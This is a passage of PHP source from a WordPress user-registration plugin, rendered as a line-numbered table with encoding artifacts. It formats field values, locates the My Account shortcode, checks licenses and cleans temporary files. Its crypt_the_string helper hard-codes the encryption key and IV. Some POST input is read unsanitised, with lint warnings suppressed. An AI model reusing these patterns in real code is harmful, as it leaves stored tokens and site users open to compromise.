| [2709](#L2709) | $field\_valueÂ =Â (Â is\_array(Â $field\_valueÂ )Â &&Â !Â empty(Â $field\_valueÂ )Â )Â ?Â implode(Â ', ',Â $field\_valueÂ )Â :Â $field\_value; |
| [2710](#L2710) | break; |
| [2711](#L2711) | caseÂ 'country': |
| [2712](#L2712) | $countriesÂ =Â UR\_Form\_Field\_Country::get\_instance()->get\_country(); |
| [2713](#L2713) | ifÂ (Â !Â isset(Â $countries[Â $field\_valueÂ ]Â )Â )Â { |
| [2714](#L2714) | $keyÂ =Â array\_search(Â $field\_value,Â $countries,Â trueÂ ); |
| [2715](#L2715) | ifÂ (Â $keyÂ )Â { |
| [2716](#L2716) | $field\_valueÂ =Â $key; |
| [2717](#L2717) | } |
| [2718](#L2718) | } |
| [2719](#L2719) | $field\_valueÂ =Â isset(Â $countries[Â $field\_valueÂ ]Â )Â ?Â $countries[Â $field\_valueÂ ]Â :Â ''; |
| [2720](#L2720) | break; |
| [2721](#L2721) | caseÂ 'file': |
| [2722](#L2722) | $attachment\_idsÂ =Â is\_array(Â $field\_valueÂ )Â ?Â $field\_valueÂ :Â explode(Â ',',Â $field\_valueÂ ); |
| [2723](#L2723) | $linksÂ  Â  Â  Â  Â  =Â array(); |
| [2724](#L2724) |  |
| [2725](#L2725) | foreachÂ (Â $attachment\_idsÂ asÂ $attachment\_idÂ )Â { |
| [2726](#L2726) | ifÂ (Â is\_numeric(Â $attachment\_idÂ )Â )Â { |
| [2727](#L2727) | $attachment\_urlÂ =Â '<a href="'Â .Â wp\_get\_attachment\_url(Â $attachment\_idÂ )Â .Â '">'Â .Â basename(Â get\_attached\_file(Â $attachment\_idÂ )Â )Â .Â '</a>'; |
| [2728](#L2728) | array\_push(Â $links,Â $attachment\_urlÂ ); |
| [2729](#L2729) | }Â elseifÂ (Â ur\_is\_valid\_url(Â $attachment\_idÂ )Â )Â { |
| [2730](#L2730) | $attachment\_urlÂ =Â '<a href="'Â .Â $attachment\_idÂ .Â '">'Â .Â $attachment\_idÂ .Â '</a>'; |
| [2731](#L2731) | array\_push(Â $links,Â $attachment\_urlÂ ); |
| [2732](#L2732) | }Â elseÂ { |
| [2733](#L2733) | array\_push(Â $links,Â $attachment\_idÂ ); |
| [2734](#L2734) | } |
| [2735](#L2735) | } |
| [2736](#L2736) |  |
| [2737](#L2737) | $field\_valueÂ =Â implode(Â ', ',Â $linksÂ ); |
| [2738](#L2738) |  |
| [2739](#L2739) | break; |
| [2740](#L2740) | caseÂ 'privacy\_policy': |
| [2741](#L2741) | ifÂ (Â ur\_string\_to\_bool(Â $field\_valueÂ )Â )Â { |
| [2742](#L2742) | $field\_valueÂ =Â 'Checked'; |
| [2743](#L2743) | }Â elseÂ { |
| [2744](#L2744) | $field\_valueÂ =Â 'Not Checked'; |
| [2745](#L2745) | } |
| [2746](#L2746) | break; |
| [2747](#L2747) | caseÂ 'wysiwyg': |
| [2748](#L2748) | $field\_valueÂ =Â html\_entity\_decode(Â $field\_valueÂ ); |
| [2749](#L2749) | break; |
| [2750](#L2750) | caseÂ 'profile\_picture': |
| [2751](#L2751) | $field\_valueÂ =Â '<img class="profile-preview" alt="Profile Picture" width="50px" height="50px" src="'Â .Â (Â is\_numeric(Â $field\_valueÂ )Â ?Â esc\_url(Â wp\_get\_attachment\_url(Â $field\_valueÂ )Â )Â :Â esc\_url(Â $field\_valueÂ )Â )Â .Â '" />'; |
| [2752](#L2752) | $field\_valueÂ =Â wp\_kses\_post(Â $field\_valueÂ ); |
| [2753](#L2753) | break; |
| [2754](#L2754) | default: |
| [2755](#L2755) | $field\_valueÂ =Â $field\_value; |
| [2756](#L2756) | break; |
| [2757](#L2757) | } |
| [2758](#L2758) |  |
| [2759](#L2759) | returnÂ $field\_value; |
| [2760](#L2760) | } |
| [2761](#L2761) | } |
| [2762](#L2762) |  |
| [2763](#L2763) | add\_action(Â 'admin\_init',Â 'user\_registration\_install\_pages\_notice'Â ); |
| [2764](#L2764) |  |
| [2765](#L2765) | ifÂ (Â !Â function\_exists(Â 'user\_registration\_install\_pages\_notice'Â )Â )Â { |
| [2766](#L2766) | /\*\* |
| [2767](#L2767) | \* Display install pages notice if the user has skipped getting started. |
| [2768](#L2768) | \* |
| [2769](#L2769) | \* @since 2.2.3 |
| [2770](#L2770) | \*/ |
| [2771](#L2771) | functionÂ user\_registration\_install\_pages\_notice()Â { |
| [2772](#L2772) |  |
| [2773](#L2773) | ifÂ (Â get\_option(Â 'user\_registration\_onboarding\_skipped',Â falseÂ )Â )Â { |
| [2774](#L2774) | UR\_Admin\_Notices::add\_notice(Â 'install'Â ); |
| [2775](#L2775) | } |
| [2776](#L2776) |  |
| [2777](#L2777) | ifÂ (Â isset(Â $\_POST['user\_registration\_myaccount\_page\_id']Â )Â )Â {Â //phpcs:ignore |
| [2778](#L2778) | $my\_account\_pageÂ =Â $\_POST['user\_registration\_myaccount\_page\_id'];Â //phpcs:ignore |
| [2779](#L2779) | }Â elseÂ { |
| [2780](#L2780) | $my\_account\_pageÂ =Â get\_option(Â 'user\_registration\_myaccount\_page\_id',Â 0Â ); |
| [2781](#L2781) | } |
| [2782](#L2782) |  |
| [2783](#L2783) | $matchedÂ  Â  Â  Â  =Â 0; |
| [2784](#L2784) | $myaccount\_pageÂ =Â array(); |
| [2785](#L2785) |  |
| [2786](#L2786) | ifÂ (Â $my\_account\_pageÂ )Â { |
| [2787](#L2787) | $myaccount\_pageÂ =Â get\_post(Â $my\_account\_pageÂ ); |
| [2788](#L2788) | } |
| [2789](#L2789) |  |
| [2790](#L2790) | ifÂ (Â !Â empty(Â $myaccount\_pageÂ )Â )Â { |
| [2791](#L2791) | $shortcodesÂ =Â parse\_blocks(Â $myaccount\_page->post\_contentÂ ); |
| [2792](#L2792) | $matchedÂ  Â  =Â ur\_find\_my\_account\_in\_page(Â $shortcodes,Â $myaccount\_page,Â $matchedÂ ); |
| [2793](#L2793) | } |
| [2794](#L2794) |  |
| [2795](#L2795) | ifÂ (Â 0Â ===Â $matchedÂ )Â { |
| [2796](#L2796) | $my\_account\_setting\_linkÂ =Â admin\_url()Â .Â 'admin.php?page=user-registration-settings#user\_registration\_myaccount\_page\_id'; |
| [2797](#L2797) |  |
| [2798](#L2798) | $messageÂ =Â sprintf( |
| [2799](#L2799) | /\* translators: %1$s - My account Link. \*/ |
| [2800](#L2800) | \_\_(Â 'Please choose a <strong title="A page with [user\_registration\_my\_account] shortcode">My Account</strong> page in <a href="%1$s" style="text-decoration:none;">General Settings</a>. <br/><strong>Got Stuck? Read</strong> <a href="https://docs.wpuserregistration.com/docs/how-to-show-account-profile/" style="text-decoration:none;" target="\_blank">How to setup My Account page</a>.',Â 'user-registration'Â ), |
| [2801](#L2801) | $my\_account\_setting\_link |
| [2802](#L2802) | ); |
| [2803](#L2803) | UR\_Admin\_Notices::add\_custom\_notice(Â 'select\_my\_account',Â $messageÂ ); |
| [2804](#L2804) | }Â elseÂ { |
| [2805](#L2805) | UR\_Admin\_Notices::remove\_notice(Â 'select\_my\_account'Â ); |
| [2806](#L2806) | } |
| [2807](#L2807) | } |
| [2808](#L2808) | } |
| [2809](#L2809) |  |
| [2810](#L2810) | ifÂ (Â !Â function\_exists(Â 'ur\_find\_my\_account\_in\_page'Â )Â )Â { |
| [2811](#L2811) |  |
| [2812](#L2812) | /\*\* |
| [2813](#L2813) | \* Find My Account Shortcode. |
| [2814](#L2814) | \* |
| [2815](#L2815) | \* @param array $shortcodes Shortcode. |
| [2816](#L2816) | \* @param mixed $myaccount\_page My Account Page. |
| [2817](#L2817) | \* @param intÂ  Â $matched Default 0. |
| [2818](#L2818) | \* @return int If matched then 1 else 0. |
| [2819](#L2819) | \* @sinceÂ  2.2.7 |
| [2820](#L2820) | \*/ |
| [2821](#L2821) | functionÂ ur\_find\_my\_account\_in\_page(Â $shortcodes,Â $myaccount\_page,Â $matchedÂ )Â { |
| [2822](#L2822) |  |
| [2823](#L2823) | foreachÂ (Â $shortcodesÂ asÂ $shortcodeÂ )Â { |
| [2824](#L2824) | ifÂ (Â !Â empty(Â $shortcode['blockName']Â )Â )Â { |
| [2825](#L2825) | ifÂ (Â 'user-registration/form-selector'Â ===Â $shortcode['blockName']Â &&Â isset(Â $shortcode['attrs']['shortcode']Â )Â )Â { |
| [2826](#L2826) | $matchedÂ =Â 1; |
| [2827](#L2827) | returnÂ $matched; |
| [2828](#L2828) | }Â elseifÂ (Â (Â 'core/shortcode'Â ===Â $shortcode['blockName']Â ||Â 'core/paragraph'Â ===Â $shortcode['blockName']Â )Â &&Â isset(Â $shortcode['innerHTML']Â )Â )Â { |
| [2829](#L2829) | $matchedÂ =Â preg\_match(Â '/\[user\_registration\_my\_account(\s\S+){0,3}\]|\[user\_registration\_login(\s\S+){0,3}\]/',Â $shortcode['innerHTML']Â ); |
| [2830](#L2830) | ifÂ (Â 1Â >Â absint(Â $matchedÂ )Â )Â { |
| [2831](#L2831) | $matchedÂ =Â preg\_match(Â '/\[woocommerce\_my\_account(\s\S+){0,3}\]/',Â $shortcode['innerHTML']Â ); |
| [2832](#L2832) | } |
| [2833](#L2833) | ifÂ (Â 0Â <Â absint(Â $matchedÂ )Â )Â { |
| [2834](#L2834) | returnÂ $matched; |
| [2835](#L2835) | } |
| [2836](#L2836) | }Â elseifÂ (Â 'core/group'Â ===Â $shortcode['blockName']Â )Â { |
| [2837](#L2837) | ifÂ (Â isset(Â $shortcode['innerBlocks']Â )Â &&Â !Â empty(Â $shortcode['innerBlocks']Â )Â )Â { |
| [2838](#L2838) | foreachÂ (Â $shortcode['innerBlocks']Â asÂ $inner\_blockÂ )Â { |
| [2839](#L2839) | ifÂ (Â 'user-registration/form-selector'Â ===Â $inner\_block['blockName']Â &&Â isset(Â $inner\_block['attrs']['shortcode']Â )Â )Â { |
| [2840](#L2840) | $matchedÂ =Â 1; |
| [2841](#L2841) | returnÂ $matched; |
| [2842](#L2842) | }Â elseifÂ (Â (Â 'core/shortcode'Â ===Â $inner\_block['blockName']Â ||Â 'core/paragraph'Â ===Â $inner\_block['blockName']Â )Â &&Â isset(Â $inner\_block['innerHTML']Â )Â )Â { |
| [2843](#L2843) | $matchedÂ =Â preg\_match(Â '/\[user\_registration\_my\_account(\s\S+){0,3}\]|\[user\_registration\_login(\s\S+){0,3}\]/',Â $inner\_block['innerHTML']Â ); |
| [2844](#L2844) | ifÂ (Â 1Â >Â absint(Â $matchedÂ )Â )Â { |
| [2845](#L2845) | $matchedÂ =Â preg\_match(Â '/\[woocommerce\_my\_account(\s\S+){0,3}\]/',Â $shortcode['innerHTML']Â ); |
| [2846](#L2846) | } |
| [2847](#L2847) | ifÂ (Â 0Â <Â absint(Â $matchedÂ )Â )Â { |
| [2848](#L2848) | returnÂ $matched; |
| [2849](#L2849) | } |
| [2850](#L2850) | }Â elseifÂ (Â 'core/group'Â ===Â $inner\_block['blockName']Â ||Â 'core/column'Â ===Â $inner\_block['blockName']Â ||Â 'core/columns'Â ===Â $inner\_block['blockName']Â )Â { |
| [2851](#L2851) |  |
| [2852](#L2852) | $matchedÂ =Â ur\_find\_my\_account\_in\_page(Â $shortcode['innerBlocks'],Â $myaccount\_page,Â $matchedÂ ); |
| [2853](#L2853) | ifÂ (Â 0Â <Â absint(Â $matchedÂ )Â )Â { |
| [2854](#L2854) | returnÂ $matched; |
| [2855](#L2855) | } |
| [2856](#L2856) | }Â elseifÂ (Â 'core/block'Â ===Â $inner\_block['blockName']Â )Â { |
| [2857](#L2857) | ifÂ (Â isset(Â $inner\_block['attrs']['ref']Â )Â &&Â !Â empty(Â $inner\_block['attrs']['ref']Â )Â )Â { |
| [2858](#L2858) | $resuable\_block\_pageÂ =Â get\_post(Â $inner\_block['attrs']['ref']Â ); |
| [2859](#L2859) | ifÂ (Â !Â empty(Â $resuable\_block\_pageÂ )Â )Â { |
| [2860](#L2860) | $resuable\_blockÂ =Â parse\_blocks(Â $resuable\_block\_page->post\_contentÂ ); |
| [2861](#L2861) | $matchedÂ  Â  Â  Â  =Â ur\_find\_my\_account\_in\_page(Â $resuable\_block,Â $resuable\_block\_page,Â $matchedÂ ); |
| [2862](#L2862) | ifÂ (Â 0Â <Â absint(Â $matchedÂ )Â )Â { |
| [2863](#L2863) | returnÂ $matched; |
| [2864](#L2864) | } |
| [2865](#L2865) | } |
| [2866](#L2866) | } |
| [2867](#L2867) | } |
| [2868](#L2868) | } |
| [2869](#L2869) | } |
| [2870](#L2870) | }Â elseifÂ (Â 'core/columns'Â ===Â $shortcode['blockName']Â )Â { |
| [2871](#L2871) | ifÂ (Â isset(Â $shortcode['innerBlocks']Â )Â &&Â !Â empty(Â $shortcode['innerBlocks']Â )Â )Â { |
| [2872](#L2872) | foreachÂ (Â $shortcode['innerBlocks']Â asÂ $inner\_blockÂ )Â { |
| [2873](#L2873) | ifÂ (Â 'user-registration/form-selector'Â ===Â $inner\_block['blockName']Â &&Â isset(Â $inner\_block['attrs']['shortcode']Â )Â )Â { |
| [2874](#L2874) | $matchedÂ =Â 1; |
| [2875](#L2875) | returnÂ $matched; |
| [2876](#L2876) | }Â elseifÂ (Â (Â 'core/shortcode'Â ===Â $inner\_block['blockName']Â ||Â 'core/paragraph'Â ===Â $inner\_block['blockName']Â )Â &&Â isset(Â $inner\_block['innerHTML']Â )Â )Â { |
| [2877](#L2877) | $matchedÂ =Â preg\_match(Â '/\[user\_registration\_my\_account(\s\S+){0,3}\]|\[user\_registration\_login(\s\S+){0,3}\]/',Â $inner\_block['innerHTML']Â ); |
| [2878](#L2878) | ifÂ (Â 1Â >Â absint(Â $matchedÂ )Â )Â { |
| [2879](#L2879) | $matchedÂ =Â preg\_match(Â '/\[woocommerce\_my\_account(\s\S+){0,3}\]/',Â $shortcode['innerHTML']Â ); |
| [2880](#L2880) | } |
| [2881](#L2881) | ifÂ (Â 0Â <Â absint(Â $matchedÂ )Â )Â { |
| [2882](#L2882) | returnÂ $matched; |
| [2883](#L2883) | } |
| [2884](#L2884) | }Â elseifÂ (Â 'core/group'Â ===Â $inner\_block['blockName']Â ||Â 'core/column'Â ===Â $inner\_block['blockName']Â ||Â 'core/columns'Â ===Â $inner\_block['blockName']Â )Â { |
| [2885](#L2885) |  |
| [2886](#L2886) | $matchedÂ =Â ur\_find\_my\_account\_in\_page(Â $inner\_block['innerBlocks'],Â $myaccount\_page,Â $matchedÂ ); |
| [2887](#L2887) |  |
| [2888](#L2888) | ifÂ (Â 0Â <Â absint(Â $matchedÂ )Â )Â { |
| [2889](#L2889) | returnÂ $matched; |
| [2890](#L2890) | } |
| [2891](#L2891) | }Â elseifÂ (Â 'core/block'Â ===Â $inner\_block['blockName']Â )Â { |
| [2892](#L2892) | ifÂ (Â isset(Â $inner\_block['attrs']['ref']Â )Â &&Â !Â empty(Â $inner\_block['attrs']['ref']Â )Â )Â { |
| [2893](#L2893) | $resuable\_block\_pageÂ =Â get\_post(Â $inner\_block['attrs']['ref']Â ); |
| [2894](#L2894) | ifÂ (Â !Â empty(Â $resuable\_block\_pageÂ )Â )Â { |
| [2895](#L2895) | $resuable\_blockÂ =Â parse\_blocks(Â $resuable\_block\_page->post\_contentÂ ); |
| [2896](#L2896) | $matchedÂ  Â  Â  Â  =Â ur\_find\_my\_account\_in\_page(Â $resuable\_block,Â $resuable\_block\_page,Â $matchedÂ ); |
| [2897](#L2897) | ifÂ (Â 0Â <Â absint(Â $matchedÂ )Â )Â { |
| [2898](#L2898) | returnÂ $matched; |
| [2899](#L2899) | } |
| [2900](#L2900) | } |
| [2901](#L2901) | } |
| [2902](#L2902) | } |
| [2903](#L2903) | } |
| [2904](#L2904) | } |
| [2905](#L2905) | }Â elseifÂ (Â 'core/block'Â ===Â $shortcode['blockName']Â )Â { |
| [2906](#L2906) |  |
| [2907](#L2907) | ifÂ (Â isset(Â $shortcode['attrs']['ref']Â )Â &&Â !Â empty(Â $shortcode['attrs']['ref']Â )Â )Â { |
| [2908](#L2908) | $resuable\_block\_pageÂ =Â get\_post(Â $shortcode['attrs']['ref']Â ); |
| [2909](#L2909) | ifÂ (Â !Â empty(Â $resuable\_block\_pageÂ )Â )Â { |
| [2910](#L2910) | $resuable\_blockÂ =Â parse\_blocks(Â $resuable\_block\_page->post\_contentÂ ); |
| [2911](#L2911) | $matchedÂ  Â  Â  Â  =Â ur\_find\_my\_account\_in\_page(Â $resuable\_block,Â $resuable\_block\_page,Â $matchedÂ ); |
| [2912](#L2912) | ifÂ (Â 0Â <Â absint(Â $matchedÂ )Â )Â { |
| [2913](#L2913) | returnÂ $matched; |
| [2914](#L2914) | } |
| [2915](#L2915) | } |
| [2916](#L2916) | } |
| [2917](#L2917) | } |
| [2918](#L2918) | }Â elseÂ { |
| [2919](#L2919) | $matchedÂ =Â preg\_match(Â '/\[user\_registration\_my\_account(\s\S+){0,3}\]|\[user\_registration\_login(\s\S+){0,3}\]/',Â $myaccount\_page->post\_contentÂ ); |
| [2920](#L2920) | ifÂ (Â 1Â >Â absint(Â $matchedÂ )Â )Â { |
| [2921](#L2921) | $matchedÂ =Â preg\_match(Â '/\[woocommerce\_my\_account(\s\S+){0,3}\]/',Â $myaccount\_page->post\_contentÂ ); |
| [2922](#L2922) | } |
| [2923](#L2923) | ifÂ (Â 0Â <Â absint(Â $matchedÂ )Â )Â { |
| [2924](#L2924) | returnÂ $matched; |
| [2925](#L2925) | } |
| [2926](#L2926) | } |
| [2927](#L2927) | } |
| [2928](#L2928) | returnÂ $matched; |
| [2929](#L2929) | } |
| [2930](#L2930) | } |
| [2931](#L2931) |  |
| [2932](#L2932) | ifÂ (Â !Â function\_exists(Â 'ur\_get\_license\_plan'Â )Â )Â { |
| [2933](#L2933) |  |
| [2934](#L2934) | /\*\* |
| [2935](#L2935) | \* Get a license plan. |
| [2936](#L2936) | \* |
| [2937](#L2937) | \* @return bool|string Plan on success, false on failure. |
| [2938](#L2938) | \* @sinceÂ  2.2.4 |
| [2939](#L2939) | \*/ |
| [2940](#L2940) | functionÂ ur\_get\_license\_plan()Â { |
| [2941](#L2941) | $license\_keyÂ =Â get\_option(Â 'user-registration\_license\_key'Â ); |
| [2942](#L2942) |  |
| [2943](#L2943) | ifÂ (Â !Â function\_exists(Â 'is\_plugin\_active'Â )Â )Â { |
| [2944](#L2944) | include\_onceÂ ABSPATHÂ .Â 'wp-admin/includes/plugin.php'; |
| [2945](#L2945) | } |
| [2946](#L2946) |  |
| [2947](#L2947) | ifÂ (Â $license\_keyÂ &&Â is\_plugin\_active(Â 'user-registration-pro/user-registration.php'Â )Â )Â { |
| [2948](#L2948) | $license\_dataÂ =Â get\_transient(Â 'ur\_pro\_license\_plan'Â ); |
| [2949](#L2949) |  |
| [2950](#L2950) | ifÂ (Â falseÂ ===Â $license\_dataÂ )Â { |
| [2951](#L2951) | $license\_dataÂ =Â json\_decode( |
| [2952](#L2952) | UR\_Updater\_Key\_API::check( |
| [2953](#L2953) | array( |
| [2954](#L2954) | 'license'Â =>Â $license\_key, |
| [2955](#L2955) | ) |
| [2956](#L2956) | ) |
| [2957](#L2957) | ); |
| [2958](#L2958) |  |
| [2959](#L2959) | ifÂ (Â !Â empty(Â $license\_data->item\_nameÂ )Â )Â { |
| [2960](#L2960) | $license\_data->item\_planÂ =Â strtolower(Â str\_replace(Â 'LifeTime',Â '',Â str\_replace(Â 'User Registration',Â '',Â $license\_data->item\_nameÂ )Â )Â ); |
| [2961](#L2961) | set\_transient(Â 'ur\_pro\_license\_plan',Â $license\_data,Â WEEK\_IN\_SECONDSÂ ); |
| [2962](#L2962) | } |
| [2963](#L2963) | } |
| [2964](#L2964) |  |
| [2965](#L2965) | returnÂ isset(Â $license\_dataÂ )Â ?Â $license\_dataÂ :Â false; |
| [2966](#L2966) | } |
| [2967](#L2967) |  |
| [2968](#L2968) | returnÂ false; |
| [2969](#L2969) | } |
| [2970](#L2970) | } |
| [2971](#L2971) |  |
| [2972](#L2972) | ifÂ (Â !Â function\_exists(Â 'ur\_get\_json\_file\_contents'Â )Â )Â { |
| [2973](#L2973) |  |
| [2974](#L2974) | /\*\* |
| [2975](#L2975) | \* UR Get json file contents. |
| [2976](#L2976) | \* |
| [2977](#L2977) | \* @param mixed $file File path. |
| [2978](#L2978) | \* @param mixed $to\_array Returned data in array. |
| [2979](#L2979) | \* @sinceÂ  2.2.4 |
| [2980](#L2980) | \*/ |
| [2981](#L2981) | functionÂ ur\_get\_json\_file\_contents(Â $file,Â $to\_arrayÂ =Â falseÂ )Â { |
| [2982](#L2982) | ifÂ (Â $to\_arrayÂ )Â { |
| [2983](#L2983) | returnÂ json\_decode(Â ur\_file\_get\_contents(Â $fileÂ ),Â trueÂ ); |
| [2984](#L2984) | } |
| [2985](#L2985) | returnÂ json\_decode(Â ur\_file\_get\_contents(Â $fileÂ )Â ); |
| [2986](#L2986) | } |
| [2987](#L2987) | } |
| [2988](#L2988) |  |
| [2989](#L2989) | ifÂ (Â !Â function\_exists(Â 'ur\_is\_valid\_url'Â )Â )Â { |
| [2990](#L2990) |  |
| [2991](#L2991) | /\*\* |
| [2992](#L2992) | \* UR file get contents. |
| [2993](#L2993) | \* |
| [2994](#L2994) | \* @param mixed $url URL. |
| [2995](#L2995) | \*/ |
| [2996](#L2996) | functionÂ ur\_is\_valid\_url(Â $urlÂ )Â { |
| [2997](#L2997) | // Must start with http:// or https://. |
| [2998](#L2998) | ifÂ (Â 0Â !==Â strpos(Â $url,Â 'http://'Â )Â &&Â 0Â !==Â strpos(Â $url,Â 'https://'Â )Â )Â { |
| [2999](#L2999) | returnÂ false; |
| [3000](#L3000) | } |
| [3001](#L3001) |  |
| [3002](#L3002) | // Must pass validation. |
| [3003](#L3003) | ifÂ (Â !Â filter\_var(Â $url,Â FILTER\_VALIDATE\_URLÂ )Â )Â { |
| [3004](#L3004) | returnÂ false; |
| [3005](#L3005) | } |
| [3006](#L3006) |  |
| [3007](#L3007) | returnÂ true; |
| [3008](#L3008) | } |
| [3009](#L3009) | } |
| [3010](#L3010) |  |
| [3011](#L3011) | ifÂ (Â !Â function\_exists(Â 'ur\_file\_get\_contents'Â )Â )Â { |
| [3012](#L3012) |  |
| [3013](#L3013) | /\*\* |
| [3014](#L3014) | \* UR file get contents. |
| [3015](#L3015) | \* |
| [3016](#L3016) | \* @param mixed $file File path. |
| [3017](#L3017) | \* @sinceÂ  2.2.4 |
| [3018](#L3018) | \*/ |
| [3019](#L3019) | functionÂ ur\_file\_get\_contents(Â $fileÂ )Â { |
| [3020](#L3020) |  |
| [3021](#L3021) | ifÂ (Â $fileÂ )Â { |
| [3022](#L3022) | globalÂ $wp\_filesystem; |
| [3023](#L3023) | require\_onceÂ ABSPATHÂ .Â '/wp-admin/includes/file.php'; |
| [3024](#L3024) | WP\_Filesystem(); |
| [3025](#L3025) | $local\_fileÂ =Â preg\_replace(Â '/\\\\|\/\//',Â '/',Â plugin\_dir\_path(Â UR\_PLUGIN\_FILEÂ )Â .Â $fileÂ ); |
| [3026](#L3026) |  |
| [3027](#L3027) | ifÂ (Â $wp\_filesystem->exists(Â $local\_fileÂ )Â )Â { |
| [3028](#L3028) | $responseÂ =Â $wp\_filesystem->get\_contents(Â $local\_fileÂ ); |
| [3029](#L3029) | returnÂ $response; |
| [3030](#L3030) | } |
| [3031](#L3031) | } |
| [3032](#L3032) | return; |
| [3033](#L3033) | } |
| [3034](#L3034) | } |
| [3035](#L3035) |  |
| [3036](#L3036) | ifÂ (Â !Â function\_exists(Â 'crypt\_the\_string'Â )Â )Â { |
| [3037](#L3037) | /\*\* |
| [3038](#L3038) | \* Encrypt/Decrypt the provided string. |
| [3039](#L3039) | \* Encrypt while setting token and updating to database, decrypt while comparing the stored token. |
| [3040](#L3040) | \* |
| [3041](#L3041) | \* @paramÂ  string $string String to encrypt/decrypt. |
| [3042](#L3042) | \* @paramÂ  string $action Encrypt/decrypt action. 'e' for encrypt and 'd' for decrypt. |
| [3043](#L3043) | \* @return string Encrypted/Decrypted string. |
| [3044](#L3044) | \*/ |
| [3045](#L3045) | functionÂ crypt\_the\_string(Â $string,Â $actionÂ =Â 'e'Â )Â { |
| [3046](#L3046) | $secret\_keyÂ =Â 'ur\_secret\_key'; |
| [3047](#L3047) | $secret\_ivÂ  =Â 'ur\_secret\_iv'; |
| [3048](#L3048) |  |
| [3049](#L3049) | $outputÂ  Â  Â  Â  Â =Â false; |
| [3050](#L3050) | $encrypt\_methodÂ =Â 'AES-256-CBC'; |
| [3051](#L3051) | $keyÂ  Â  Â  Â  Â  Â  =Â hash(Â 'sha256',Â $secret\_keyÂ ); |
| [3052](#L3052) | $ivÂ  Â  Â  Â  Â  Â  Â =Â substr(Â hash(Â 'sha256',Â $secret\_ivÂ ),Â 0,Â 16Â ); |
| [3053](#L3053) |  |
| [3054](#L3054) | ifÂ (Â 'e'Â ==Â $actionÂ )Â { |
| [3055](#L3055) | ifÂ (Â function\_exists(Â 'openssl\_encrypt'Â )Â )Â { |
| [3056](#L3056) | $outputÂ =Â base64\_encode(Â openssl\_encrypt(Â $string,Â $encrypt\_method,Â $key,Â 0,Â $ivÂ )Â ); |
| [3057](#L3057) | }Â elseÂ { |
| [3058](#L3058) | $outputÂ =Â base64\_encode(Â $stringÂ ); |
| [3059](#L3059) | } |
| [3060](#L3060) | }Â elseifÂ (Â 'd'Â ==Â $actionÂ )Â { |
| [3061](#L3061) | ifÂ (Â function\_exists(Â 'openssl\_decrypt'Â )Â )Â { |
| [3062](#L3062) | $outputÂ =Â openssl\_decrypt(Â base64\_decode(Â $stringÂ ),Â $encrypt\_method,Â $key,Â 0,Â $ivÂ ); |
| [3063](#L3063) | }Â elseÂ { |
| [3064](#L3064) | $outputÂ =Â base64\_decode(Â $stringÂ ); |
| [3065](#L3065) | } |
| [3066](#L3066) | } |
| [3067](#L3067) |  |
| [3068](#L3068) | returnÂ $output; |
| [3069](#L3069) | } |
| [3070](#L3070) | }Â //phpcs:ignore |
| [3071](#L3071) |  |
| [3072](#L3072) |  |
| [3073](#L3073) | ifÂ (Â !Â function\_exists(Â 'ur\_clean\_tmp\_files'Â )Â )Â { |
| [3074](#L3074) | /\*\* |
| [3075](#L3075) | \* Clean up the tmp folder - remove all old files every day (filterable interval). |
| [3076](#L3076) | \*/ |
| [3077](#L3077) | functionÂ ur\_clean\_tmp\_files()Â { |
| [3078](#L3078) | $filesÂ =Â glob(Â trailingslashit(Â ur\_get\_tmp\_dir()Â )Â .Â '\*'Â ); |
| [3079](#L3079) |  |
| [3080](#L3080) | ifÂ (Â !Â is\_array(Â $filesÂ )Â ||Â empty(Â $filesÂ )Â )Â { |
| [3081](#L3081) | return; |
| [3082](#L3082) | } |
| [3083](#L3083) |  |
| [3084](#L3084) | $lifespanÂ =Â (int)Â apply\_filters(Â 'user\_registration\_clean\_tmp\_files\_lifespan',Â DAY\_IN\_SECONDSÂ ); |
| [3085](#L3085) |  |
| [3086](#L3086) | foreachÂ (Â $filesÂ asÂ $fileÂ )Â { |
| [3087](#L3087) | ifÂ (Â !Â is\_file(Â $fileÂ )Â )Â { |
| [3088](#L3088) | continue; |
| [3089](#L3089) | } |
| [3090](#L3090) |  |
| [3091](#L3091) | // In some cases filemtime() can return false, in that case - pretend this is a new file and do nothing. |
| [3092](#L3092) | $modifiedÂ =Â (int)Â filemtime(Â $fileÂ ); |
| [3093](#L3093) | ifÂ (Â empty(Â $modifiedÂ )Â )Â { |
| [3094](#L3094) | $modifiedÂ =Â time(); |
| [3095](#L3095) | } |
| [3096](#L3096) |  |
| [3097](#L3097) | ifÂ (Â (Â time()Â -Â $modifiedÂ )Â >=Â $lifespanÂ )Â { |
| [3098](#L3098) | @unlink(Â $fileÂ );Â // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged |
| [3099](#L3099) | } |
| [3100](#L3100) | } |
| [3101](#L3101) | } |
| [3102](#L3102) | } |
| [3103](#L3103) |  |
| [3104](#L3104) | ifÂ (Â !Â function\_exists(Â 'ur\_get\_tmp\_dir'Â )Â )Â { |
| [3105](#L3105) | /\*\* |
| [3106](#L3106) | \* Get tmp dir for files. |
| [3107](#L3107) | \* |
| [3108](#L3108) | \* @return string |
| [3109](#L3109) | \*/ |
| [3110](#L3110) | functionÂ ur\_get\_tmp\_dir()Â { |
| [3111](#L3111) | $tmp\_rootÂ =Â UR\_UPLOAD\_PATHÂ .Â 'temp-uploads'; |
| [3112](#L3112) |  |
| [3113](#L3113) | ifÂ (Â !Â file\_exists(Â $tmp\_rootÂ )Â ||Â !Â wp\_is\_writable(Â $tmp\_rootÂ )Â )Â { |
| [3114](#L3114) | wp\_mkdir\_p(Â $tmp\_rootÂ ); |
| [3115](#L3115) | } |
| [3116](#L3116) |  |
| [3117](#L3117) | $indexÂ =Â trailingslashit(Â $tmp\_rootÂ )Â .Â 'index.html'; |
| [3118](#L3118) |  |
| [3119](#L3119) | ifÂ (Â !Â file\_exists(Â $indexÂ )Â )Â { |
| [3120](#L3120) | file\_put\_contents(Â $index,Â ''Â );Â // phpcs:ignore WordPress.WP.AlternativeFunctions |
| [3121](#L3121) | } |
| [3122](#L3122) |  |
| [3123](#L3123) | returnÂ $tmp\_root; |
| [3124](#L3124) | } |
| [3125](#L3125) | } |
| [3126](#L3126) |  |
| [3127](#L3127) | ifÂ (Â !Â function\_exists(Â 'ur\_get\_user\_roles'Â )Â )Â { |
| [3128](#L3128) | /\*\* |
| [3129](#L3129) | \* Returns an array of all roles associated with the user. |
| [3130](#L3130) | \* |
| [3131](#L3131) | \* @param [int] $user\_id User Id. |
| [3132](#L3132) | \* |
| [3133](#L3133) | \* @returns array |
| [3134](#L3134) | \*/ |
| [3135](#L3135) | functionÂ ur\_get\_user\_roles(Â $user\_idÂ )Â { |
